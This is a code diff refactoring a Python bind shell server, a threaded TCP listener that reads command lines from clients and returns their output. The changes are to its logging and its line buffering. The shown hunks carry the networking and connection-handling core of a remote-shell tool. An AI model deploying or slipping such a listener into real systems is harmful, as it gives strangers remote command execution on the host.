@@ -14,6 +14,7 @@ DEFAULT_MAX_CONNECTIONS = 4
 DEFAULT_COMMAND_TIMEOUT = 30
 DEFAULT_CLIENT_TIMEOUT = 300
 BUFFER_SIZE = 2048
+LOGGER = logging.getLogger(__name__)
 
 
 class BindShellError(Exception):
@@ -73,21 +74,23 @@ class BindShell:
             return f"Error: {exc}\n".encode("utf-8", errors="replace")
 
     def _recv_line(
-        self, client_socket: socket.socket, buffer: bytes
-    ) -> tuple[Optional[bytes], bytes]:
-        while b"\n" not in buffer:
+        self, client_socket: socket.socket, buffer: bytearray
+    ) -> tuple[Optional[bytes], bytearray]:
+        while True:
+            newline_idx = buffer.find(b"\n")
+            if newline_idx != -1:
+                line = bytes(buffer[:newline_idx])
+                remainder = buffer[newline_idx + 1 :]
+                return line, bytearray(remainder)
             chunk = client_socket.recv(BUFFER_SIZE)
             if not chunk:
                 return None, buffer
-            buffer += chunk
-        line, _, remainder = buffer.partition(b"\n")
-        return line, remainder
+            buffer.extend(chunk)
 
     def handle_client(self, client_socket: socket.socket) -> None:
         """Handle incoming client connection."""
-        logger = logging.getLogger(__name__)
         client_socket.settimeout(self.client_timeout)
-        buffer = b""
+        buffer = bytearray()
         try:
             while True:
                 line, buffer = self._recv_line(client_socket, buffer)
@@ -102,15 +105,14 @@ class BindShell:
                 if output:
                     client_socket.sendall(output)
         except socket.timeout:
-            logger.info("Client connection timed out.")
+            LOGGER.info("Client connection timed out.")
         except Exception:
-            logger.exception("Unhandled client error.")
+            LOGGER.exception("Unhandled client error.")
         finally:
             client_socket.close()
 
     def start(self) -> None:
         """Start the bind shell server."""
-        logger = logging.getLogger(__name__)
         self._running = True
         try:
             self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -121,7 +123,7 @@ class BindShell:
             self._running = False
             raise BindShellError(f"Failed to start server: {exc}") from exc
 
-        logger.info("Bind shell listening on %s:%s", self.host, self.port)
+        LOGGER.info("Bind shell listening on %s:%s", self.host, self.port)
 
         try:
             while self._running:
@@ -131,12 +133,12 @@ class BindShell:
                     if not self._running:
                         break
                     raise
-                logger.info("Connection from %s", address)
+                LOGGER.info("Connection from %s", address)
                 thread = Thread(target=self.handle_client, args=(client_socket,))
                 thread.daemon = True
                 thread.start()
         except KeyboardInterrupt:
-            logger.info("Shutting down...")
+            LOGGER.info("Shutting down...")
         finally:
             self.stop()
 
